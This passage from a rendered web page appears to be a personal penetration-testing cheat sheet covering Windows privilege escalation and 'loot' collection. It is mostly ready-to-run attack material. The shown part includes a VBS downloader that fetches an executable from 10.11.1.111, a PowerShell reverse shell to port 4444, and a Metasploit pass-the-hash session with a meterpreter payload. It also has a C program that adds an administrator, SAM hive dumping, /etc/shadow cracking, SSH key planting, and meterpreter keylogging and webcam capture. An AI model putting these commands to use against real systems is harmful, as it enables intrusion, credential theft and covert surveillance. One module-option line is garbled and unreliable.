+<span style=color:#fff;font-weight:700>echo</span> http.Send &gt;&gt; wget.vbs
+<span style=color:#fff;font-weight:700>echo</span> varByteArray = http.ResponseBody &gt;&gt; wget.vbs
+<span style=color:#fff;font-weight:700>echo</span> Set http = Nothing &gt;&gt; wget.vbs
+<span style=color:#fff;font-weight:700>echo</span> Set fs = CreateObject(<span style=color:#0ff;font-weight:700>&#34;Scripting.FileSystemObject&#34;</span>) &gt;&gt; wget.vbs
+<span style=color:#fff;font-weight:700>echo</span> Set ts = fs.CreateTextFile(StrFile,True) &gt;&gt; wget.vbs
+<span style=color:#fff;font-weight:700>echo</span> strData = <span style=color:#0ff;font-weight:700>&#34;&#34;</span> &gt;&gt; wget.vbs
+<span style=color:#fff;font-weight:700>echo</span> strBuffer = <span style=color:#0ff;font-weight:700>&#34;&#34;</span> &gt;&gt; wget.vbs
+<span style=color:#fff;font-weight:700>echo</span> For lngCounter = 0 to UBound(varByteArray) &gt;&gt; wget.vbs
+<span style=color:#fff;font-weight:700>echo</span> ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1,1))) &gt;&gt; wget.vbs
+<span style=color:#fff;font-weight:700>echo</span> Next &gt;&gt; wget.vbs
+<span style=color:#fff;font-weight:700>echo</span> ts.Close &gt;&gt; wget.vbs
+
+# Execute
+cscript wget.vbs http://10.11.1.111/file.exe file.exe
+
+</code></pre></div><h3 id=pass-the-hash>Pass The Hash
+<a class=heading-link href=#pass-the-hash><i class="fa fa-link" aria-hidden=true></i></a></h3><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#007f7f># Login as user only with hashdump</span>
+<span style=color:#007f7f># From this hashdump</span>
+<span style=color:#007f7f># admin2:1000:aad3b435b51404eeaad3b435b51404ee:7178d3046e7ccfac0469f95588b6bdf7:::</span>
+
+msf5 &gt; use exploit/windows/smb/psexec
+msf5 exploit(windows/smb/psexec) &gt; options
+
+Module options (exploit/windows/smb/psexec):
+
+   Name                  Current Setting  Required  Description
+   ----                  ---------------  --------  -----------
+   RHOSTS                                 yes       The target address range or CIDR identifier
+   RPORT                 <span style=color:#ff0;font-weight:700>445</span>              yes       The SMB service port (TCP)
+   SERVICE_DESCR10.11.1.111TION                    no        Service description to to be used on target <span style=color:#fff;font-weight:700>for</span> pretty listing
+   SERVICE_DISPLAY_NAME                   no        The service display name
+   SERVICE_NAME                           no        The service name
+   SHARE                 ADMIN$           yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder share
+   SMBDomain             .                no        The Windows domain to use <span style=color:#fff;font-weight:700>for</span> authentication
+   SMBPass                                no        The password <span style=color:#fff;font-weight:700>for</span> the specified username
+   SMBUser                                no        The username to authenticate as
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   <span style=color:#ff0;font-weight:700>0</span>   Automatic
+
+msf5 exploit(windows/smb/psexec) &gt; <span style=color:#fff;font-weight:700>set</span> rhosts 10.10.0.100
+rhosts =&gt; 10.10.0.100
+
+msf5 exploit(windows/smb/psexec) &gt; <span style=color:#fff;font-weight:700>set</span> smbuser admin2
+
+smbuser =&gt; admin2
+
+msf5 exploit(windows/smb/psexec) &gt; <span style=color:#fff;font-weight:700>set</span> smbpass aad3b435b51404eeaad3b435b51404ee:7178d3046e7ccfac0469f95588b6bdf7
+
+smbpass =&gt; aad3b435b51404eeaad3b435b51404ee:7178d3046e7ccfac0469f95588b6bdf7
+
+msf5 exploit(windows/smb/psexec) &gt; <span style=color:#fff;font-weight:700>set</span> payload windows/x64/meterpreter/reverse_tcp
+
+payload =&gt; windows/x64/meterpreter/reverse_tcp
+
+</code></pre></div><h3 id=scripts-1>Scripts
+<a class=heading-link href=#scripts-1><i class="fa fa-link" aria-hidden=true></i></a></h3><h4 id=useradd>Useradd
+<a class=heading-link href=#useradd><i class="fa fa-link" aria-hidden=true></i></a></h4><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=color:#0f0;font-weight:700>#include</span> <span style=color:#0f0;font-weight:700>&lt;stdlib.h&gt; /* system, NULL, EXIT_FAILURE */</span><span style=color:#0f0;font-weight:700>
+</span><span style=color:#0f0;font-weight:700></span>
+<span style=color:#fff;font-weight:700>int</span> main ()
+{
+  <span style=color:#fff;font-weight:700>int</span> i;
+  i=system (<span style=color:#0ff;font-weight:700>&#34;net user &lt;username&gt; &lt;password&gt; /add &amp;&amp; net localgroup administrators &lt;username&gt; /add&#34;</span>);
+  <span style=color:#fff;font-weight:700>return</span> <span style=color:#ff0;font-weight:700>0</span>;
+}
+
+<span style=color:#0f0;font-weight:700># Compile
+</span><span style=color:#0f0;font-weight:700></span>i686-w64-mingw32-gcc -o useradd.exe useradd.c
+</code></pre></div><h4 id=powershell-run-as>Powershell Run As
+<a class=heading-link href=#powershell-run-as><i class="fa fa-link" aria-hidden=true></i></a></h4><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cmd data-lang=cmd><span style=color:#fff;font-weight:700>echo</span> $username = &#39;&lt;username&gt;&#39; &gt; runas.ps1
+<span style=color:#fff;font-weight:700>echo</span> $securePassword = ConvertTo-SecureString <span style=color:#0ff;font-weight:700>&#34;&lt;password&gt;&#34;</span> -AsPlainText -Force &gt;&gt; runas.ps1
+<span style=color:#fff;font-weight:700>echo</span> $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword &gt;&gt; runas.ps1
+<span style=color:#fff;font-weight:700>echo</span> Start-Process C:\Users\User\AppData\Local\Temp\backdoor.exe -Credential $credential &gt;&gt; runas.ps1
+
+</code></pre></div><h4 id=powershell-reverse-shell>Powershell Reverse Shell
+<a class=heading-link href=#powershell-reverse-shell><i class="fa fa-link" aria-hidden=true></i></a></h4><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cmd data-lang=cmd>Set-ExecutionPolicy Bypass
+
+$client = New-Object System.Net.Sockets.TCPClient(&#39;10.11.1.111&#39;,4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data <span style=color:#ff0;font-weight:700>2</span>&gt;&amp;<span style=color:#ff0;font-weight:700>1</span> | Out-String );$sendback2 = $sendback + &#39;PS &#39; + (pwd).Path + &#39;&gt; &#39;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+
+</code></pre></div><h3 id=windows-privescenum-tools>Windows privesc/enum tools
+<a class=heading-link href=#windows-privescenum-tools><i class="fa fa-link" aria-hidden=true></i></a></h3><ul><li><a href=https://github.com/AonCyberLabs/Windows-Exploit-Suggester/blob/master/windows-exploit-suggester.py>windows-exploit-suggester</a></li><li><a href=https://github.com/pentestmonkey/windows-privesc-check>windows-privesc-check</a></li><li><a href=https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1>PowerUp</a></li></ul><h3 id=windows-precompiled-exploits>Windows precompiled exploits
+<a class=heading-link href=#windows-precompiled-exploits><i class="fa fa-link" aria-hidden=true></i></a></h3><ul><li><a href=https://github.com/abatchy17/WindowsExploits>WindowsExploits</a></li></ul><h3 id=windows-port-forwarding>Windows Port Forwarding
+<a class=heading-link href=#windows-port-forwarding><i class="fa fa-link" aria-hidden=true></i></a></h3><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=color:#007f7f># Listen on local port 8080 and forward incoming traffic to REMOT_HOST:PORT via SSH_SERVER</span>
+<span style=color:#007f7f># Scenario: access a host that&#39;s being blocked by a firewall via SSH_SERVER;</span>
+ssh -L 127.0.0.1:8080:REMOTE_HOST:PORT user@SSH_SERVER
+
+<span style=color:#007f7f># Run in victim (5985 WinRM):</span>
+plink -l LOCALUSER -pw LOCALPASSWORD LOCALIP -R 5985:127.0.0.1:5985 -P <span style=color:#ff0;font-weight:700>221</span>
+
+</code></pre></div><h1 id=loot->Loot :
+<a class=heading-link href=#loot-><i class="fa fa-link" aria-hidden=true></i></a></h1><h2 id=linux-1>Linux
+<a class=heading-link href=#linux-1><i class="fa fa-link" aria-hidden=true></i></a></h2><h3 id=passwords-and-hashes>Passwords and hashes
+<a class=heading-link href=#passwords-and-hashes><i class="fa fa-link" aria-hidden=true></i></a></h3><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>cat /etc/passwd
+cat /etc/shadow
+
+unshadow passwd shadow &gt; unshadowed.txt
+john --rules --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
+
+</code></pre></div><h3 id=dualhomed>Dualhomed
+<a class=heading-link href=#dualhomed><i class="fa fa-link" aria-hidden=true></i></a></h3><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>ifconfig
+ifconfig -a
+arp -a
+
+</code></pre></div><h3 id=tcpdump>Tcpdump
+<a class=heading-link href=#tcpdump><i class="fa fa-link" aria-hidden=true></i></a></h3><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>tcpdump -i any -s0 -w capture.pcap
+tcpdump -i eth0 -w capture -n -U -s <span style=color:#ff0;font-weight:700>0</span> src not $IP and dst not $IP
+tcpdump -vv -i eth0 src not $IP and dst not $IP
+
+</code></pre></div><h3 id=interesting-files>Interesting files
+<a class=heading-link href=#interesting-files><i class="fa fa-link" aria-hidden=true></i></a></h3><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#007f7f>#Meterpreter</span>
+search -f *.txt
+search -f *.zip
+search -f *.doc
+search -f *.xls
+search -f config*
+search -f *.rar
+search -f *.docx
+search -f *.sql
+use auxiliary/sniffer/psnuffle
+
+.ssh/
+.bash_history
+
+</code></pre></div><h3 id=databases>Databases
+<a class=heading-link href=#databases><i class="fa fa-link" aria-hidden=true></i></a></h3><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback></code></pre></div><h3 id=ssh-keys-1>SSH-Keys
+<a class=heading-link href=#ssh-keys-1><i class="fa fa-link" aria-hidden=true></i></a></h3><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>mkdir /root/.ssh 2&gt;/dev/null; <span style=color:#fff;font-weight:700>echo</span> <span style=color:#0ff;font-weight:700>&#39;&lt;your ssh-key&gt;&#39;</span> &gt;&gt; /root/.ssh/authorized_keys
+
+</code></pre></div><h3 id=browser>Browser
+<a class=heading-link href=#browser><i class="fa fa-link" aria-hidden=true></i></a></h3><h3 id=mail>Mail
+<a class=heading-link href=#mail><i class="fa fa-link" aria-hidden=true></i></a></h3><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>/var/mail
+/var/spool/mail
+
+</code></pre></div><h3 id=gui>GUI
+<a class=heading-link href=#gui><i class="fa fa-link" aria-hidden=true></i></a></h3><p>If there is a gui we want to check out the browser.</p><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#fff;font-weight:700>echo</span> $DESKTOP_SESSION
+<span style=color:#fff;font-weight:700>echo</span> $XDG_CURRENT_DESKTOP
+<span style=color:#fff;font-weight:700>echo</span> $GDMSESSION
+
+</code></pre></div><h2 id=windows-1>Windows
+<a class=heading-link href=#windows-1><i class="fa fa-link" aria-hidden=true></i></a></h2><h3 id=passwords-and-hashes-1>Passwords and hashes
+<a class=heading-link href=#passwords-and-hashes-1><i class="fa fa-link" aria-hidden=true></i></a></h3><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>wce32.exe -w
+wce64.exe -w
+fgdump.exe
+
+<span style=color:#007f7f># Loot passwords without tools</span>
+reg.exe save hklm<span style=color:#0ff;font-weight:700>\s</span>am c:<span style=color:#0ff;font-weight:700>\s</span>am_backup
+reg.exe save hklm<span style=color:#0ff;font-weight:700>\s</span>ecurity c:<span style=color:#0ff;font-weight:700>\s</span>ecurity_backup
+reg.exe save hklm<span style=color:#0ff;font-weight:700>\s</span>ystem c:<span style=color:#0ff;font-weight:700>\s</span>ystem
+
+<span style=color:#007f7f># Meterpreter</span>
+hashdump
+load mimikatz
+msv
+
+</code></pre></div><h3 id=dualhomed-1>Dualhomed
+<a class=heading-link href=#dualhomed-1><i class="fa fa-link" aria-hidden=true></i></a></h3><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>ipconfig /all
+route print
+
+<span style=color:#007f7f># What other machines have been connected</span>
+arp -a
+
+</code></pre></div><h3 id=tcpdump-1>Tcpdump
+<a class=heading-link href=#tcpdump-1><i class="fa fa-link" aria-hidden=true></i></a></h3><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#007f7f># Meterpreter</span>
+run packetrecorder -li
+run packetrecorder -i <span style=color:#ff0;font-weight:700>1</span>
+</code></pre></div><h3 id=interesting-files-1>Interesting files
+<a class=heading-link href=#interesting-files-1><i class="fa fa-link" aria-hidden=true></i></a></h3><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#007f7f>#Meterpreter</span>
+search -f *.txt
+search -f *.zip
+search -f *.doc
+search -f *.xls
+search -f config*
+search -f *.rar
+search -f *.docx
+search -f *.sql
+hashdump
+keysscan_start
+keyscan_dump
+keyscan_stop
+webcam_snap
+
+<span style=color:#007f7f># How to cat files in meterpreter</span>
+cat c:<span style=color:#0ff;font-weight:700>\\</span>Inetpub<span style=color:#0ff;font-weight:700>\\</span>iissamples<span style=color:#0ff;font-weight:700>\\</span>sdk<span style=color:#0ff;font-weight:700>\\</span>asp<span style=color:#0ff;font-weight:700>\\</span>components<span style=color:#0ff;font-weight:700>\\</span>adrot.txt
+
+<span style=color:#007f7f># Recursive search</span>
+dir /s
+
+</code></pre></div></article></section></div><footer class=footer><section class=container><p>2021</p></section></footer></main><script src=/js/coder.min.235666b114443867d43eeb5799d51f6252965e5163f338285e113fa381d3d27e.js integrity="sha256-I1ZmsRREOGfUPutXmdUfYlKWXlFj8zgoXhE/o4HT0n4="></script><script>(function(e,b,f,c,a,d){b[c]=b[c]||function(){(b[c].q=b[c].q||[]).push(arguments)},a=e.createElement('script'),d=e.getElementsByTagName('script')[0],a.async=1,a.src=f,a.id='fathom-script',d.parentNode.insertBefore(a,d)})(document,window,'//analytics.example.com/tracker.js','fathom'),fathom('set','siteId','ABCDE'),fathom('trackPageview')</script><script async defer data-domain=example.com src=https://analytics.example.com/js/plausible.js></script><script data-goatcounter=https://ovenell-guru.goatcounter.com/count async src=//gc.zgo.at/count.js></script></body></html>
